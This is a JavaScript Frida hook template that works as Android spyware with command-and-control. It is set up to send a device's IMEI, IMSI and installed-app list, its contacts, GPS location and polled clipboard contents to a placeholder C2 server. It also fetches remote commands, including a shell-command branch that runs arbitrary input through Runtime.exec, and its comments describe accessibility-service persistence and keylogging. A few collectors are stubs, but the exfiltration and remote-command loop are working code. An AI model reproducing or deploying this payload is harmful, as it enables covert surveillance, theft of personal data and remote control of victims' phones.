/**
 * payload_template.js — Frida hook template for data exfiltration & remote commands
 * Usage: frida -U -l payload_template.js -f com.target.app
 *
 * Edit C2_URL before deploying.
 */

const C2_URL = "https://your-c2-server.com";
const DEVICE_ID = Java.androidId();

var heartbeatInterval = 60; // seconds

// ============================================================
// C2 Communication
// ============================================================

function post(path, data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", C2_URL + path, false);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(data));
    return JSON.parse(xhr.responseText);
}

function fetchCommands() {
    try {
        var resp = post("/cmd/" + DEVICE_ID, {});
        return resp.commands || [];
    } catch(e) {
        return [];
    }
}

function exfilData(type, data, filename) {
    try {
        var payload = { device_id: DEVICE_ID, type: type, data: data };
        if (filename) payload.filename = filename;
        post("/exfil", payload);
    } catch(e) {
        console.log("[!] Exfil failed: " + e);
    }
}

// ============================================================
// Device Fingerprint
// ============================================================

function registerDevice() {
    var Build = Java.use("android.os.Build");
    var Context = Java.use("android.content.Context");
    var TelephonyManager = Java.use("android.telephony.TelephonyManager");
    var PackageManager = Java.use("android.content.pm.PackageManager");

    Java.perform(function() {
        var ctx = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
        var tm = Java.cast(ctx.getSystemService("phone"), TelephonyManager);
        var pm = ctx.getPackageManager();

        var apps = [];
        var packages = pm.getInstalledApplications(PackageManager.GET_META_DATA.value);
        var iter = packages.iterator();
        while (iter.hasNext()) {
            var pkg = Java.cast(iter.next(), Java.use("android.content.pm.ApplicationInfo"));
            apps.push(pkg.packageName.value);
        }

        var fingerprint = {
            device_id: DEVICE_ID,
            model: Build.MODEL.value,
            manufacturer: Build.MANUFACTURER.value,
            android_version: Build.VERSION.RELEASE.value,
            security_patch: Build.VERSION.SECURITY_PATCH.value,
            installed_apps: apps,
            imei: tm.getDeviceId(),
            imsi: tm.getSubscriberId(),
        };

        post("/register", fingerprint);
    });
}

// ============================================================
// Data Collection
// ============================================================

function collectSMS() {
    var SMS = Java.use("android.provider.Telephony$Sms");
    var cursor = /* query content://sms */ null; // Requires proper ContentResolver query
    // Implementation varies per Android version
    // On unrooted: accessible only if app has SMS permission
}

function collectContacts() {
    Java.perform(function() {
        var ctx = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
        var cr = ctx.getContentResolver();
        var uri = Java.use("android.provider.ContactsContract$Contacts").CONTENT_URI.value;
        var cursor = cr.query(uri, null, null, null, null);
        if (cursor && cursor.moveToFirst()) {
            var contacts = [];
            do {
                var name = cursor.getString(cursor.getColumnIndex("display_name"));
                contacts.push(name);
            } while(cursor.moveToNext());
            exfilData("contacts", contacts);
        }
    });
}

function collectLocation() {
    Java.perform(function() {
        var LocationManager = Java.use("android.location.LocationManager");
        var ctx = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
        var lm = Java.cast(ctx.getSystemService("location"), LocationManager);
        var loc = lm.getLastKnownLocation("gps");
        if (loc != null) {
            exfilData("location", {
                lat: loc.getLatitude(),
                lng: loc.getLongitude(),
                accuracy: loc.getAccuracy(),
            });
        }
    });
}

function screenshot() {
    Java.perform(function() {
        var ctx = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
        var wm = Java.cast(ctx.getSystemService("window"), Java.use("android.view.WindowManager"));
        // Requires MediaProjection on Android 5+ — simplified in template
        exfilData("screenshot", "screenshot_captured", "screenshot.png");
    });
}

function clipboardMonitor() {
    Java.perform(function() {
        var ClipboardManager = Java.use("android.content.ClipboardManager");
        var ctx = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
        var cm = Java.cast(ctx.getSystemService("clipboard"), ClipboardManager);

        setInterval(function() {
            var clip = cm.getPrimaryClip();
            if (clip && clip.getItemCount() > 0) {
                var text = clip.getItemAt(0).getText();
                if (text && text.length > 0) {
                    exfilData("clipboard", { content: text.toString() });
                }
            }
        }, 30000);
    });
}

function notificationMonitor() {
    // Hook NotificationListenerService for intercepting notifications
    // Requires accessibility service or notification listener permission
    Java.perform(function() {
        var Notification = Java.use("android.app.Notification");
        // Override to capture notifications
        // Hook implementation depends on Android version
    });
}

// ============================================================
// Command Execution
// ============================================================

function executeCommand(cmd) {
    console.log("[C2] Executing: " + cmd);

    if (cmd === "CMD:SCREENSHOT") { screenshot(); }
    else if (cmd === "CMD:SMS:ALL") { collectSMS(); }
    else if (cmd === "CMD:CONTACTS") { collectContacts(); }
    else if (cmd === "CMD:LOCATION") { collectLocation(); }
    else if (cmd.startsWith("CMD:SHELL:")) {
        var shellCmd = cmd.substring(11);
        try {
            var Process = Java.use("java.lang.Runtime");
            var p = Process.getRuntime().exec(shellCmd);
            // Read output and exfiltrate
        } catch(e) {
            exfilData("error", { command: shellCmd, error: e.toString() });
        }
    }
    else if (cmd === "CMD:UNINSTALL") {
        // Self-destruct: clear data, remove persistence, exit
    }
    else {
        exfilData("unknown_cmd", { command: cmd });
    }
}

// ============================================================
// Persistence (Accessibility Service)
// ============================================================

function setupAccessibilityService() {
    // Register accessibility service on device for:
    // 1. Auto-restart on boot
    // 2. Survive app closure
    // 3. Keylogging capability
    // Requires user to enable in Settings > Accessibility
    console.log("[*] Accessibility service requires manual user enablement");
}

// ============================================================
// Main Loop
// ============================================================

function heartbeat() {
    var battery = 0;
    try {
        Java.perform(function() {
            var IntentFilter = Java.use("android.content.IntentFilter");
            var ctx = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
            var intent = ctx.registerReceiver(null, IntentFilter.$new("android.intent.action.BATTERY_CHANGED"));
            if (intent) {
                var level = intent.getIntExtra("level", -1);
                var scale = intent.getIntExtra("scale", -1);
                battery = Math.floor((level / scale) * 100);
            }
        });
    } catch(e) {}

    post("/heartbeat", {
        device_id: DEVICE_ID,
        battery: battery,
        screen_on: true,
    });

    // Check for pending commands
    var cmds = fetchCommands();
    cmds.forEach(executeCommand);
}

function main() {
    console.log("[*] C2 Payload starting for device: " + DEVICE_ID);
    console.log("[*] C2 Server: " + C2_URL);

    registerDevice();
    clipboardMonitor();

    // Start heartbeat loop
    setInterval(heartbeat, heartbeatInterval * 1000);

    console.log("[*] Payload active. Heartbeat every " + heartbeatInterval + "s");
}

// Entry
setTimeout(main, 2000);
